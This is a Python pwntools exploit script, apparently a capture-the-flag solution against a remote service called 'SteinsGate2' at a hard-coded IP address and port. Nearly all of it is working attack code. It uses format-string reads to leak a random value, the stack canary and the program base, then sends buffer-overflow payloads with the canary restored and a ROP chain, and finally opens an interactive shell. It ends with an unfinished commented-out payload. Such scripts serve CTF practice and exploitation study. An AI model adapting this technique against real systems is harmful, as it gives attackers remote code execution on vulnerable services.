from pwn import *
context.arch = 'amd64'
#r = process('./SteinsGate2')
r=remote('118.24.3.214',11003)

r.recvuntil('ID:')
r.sendline('/bin/sh\x00')

r.recvuntil('ratio:1.')
leak0 = int(r.recvuntil('\n').strip(),10)
log.info('leak0:'+str(hex(leak0)))
r.recvuntil('To seek the truth of the world.\n')
payload = 'a'*0x30
payload += p32(0x2333)
r.send(payload)

r.recvuntil('ratio:1.')
leak1 = int(r.recvuntil('\n').strip(),10)
log.info('leak1:'+str(hex(leak1)))
r.recvuntil('Repeater is nature of man.\n')
payload = '%7$p'
r.send(payload)
leak = int(r.recv(10),16)
log.info('rand='+str(hex(leak)))
r.recvuntil('You found it?\n')
payload = p32(0x6666)*12+p32(leak+0x1234)
r.send(payload)

r.recvuntil('ratio:1.')
leak2 = int(r.recvuntil('\n').strip(),10)
log.info('leak2:'+str(hex(leak2)))
r.recvuntil('Payment of past debts.\n')
r.send('%11$p')
canary = int(r.recv(18),16)
log.info('canary='+str(hex(canary)))

r.recvuntil('To seek the truth of the world.\n')
payload = p32(0x6666)*12+p64(0x2333)+p64(canary)+p32(0x6666)*2+p16((leak2&0xf000)+0xdf5)
r.send(payload)

r.recvuntil('Repeater is nature of man.\n')
payload = '%7$p'
r.send(payload)
leak = int(r.recv(10),16)
log.info('rand='+str(hex(leak)))
r.recvuntil('You found it?\n')
payload = p32(0x6666)*12+p32(leak+0x1234)
r.send(payload)

r.recvuntil('Payment of past debts.\n')
r.send('%15$p')
pbase = int(r.recv(14),16)-0xc00
log.info('pbase='+str(hex(pbase)))

r.recvuntil('To seek the truth of the world.\n')
payload = p32(0x6666)*12+p64(0x2333)+p64(canary)+p32(0x6666)*2
payload += p64(pbase+0xe83)+p64(pbase+0x202040)+p64(pbase+0xc78)
r.send(payload)

r.interactive()
'''
r.recvuntil('To seek the truth of the world.\n')
payload = 'a'*0x30
payload += p64(0x2333)
payload += 
r.send(payload)
'''
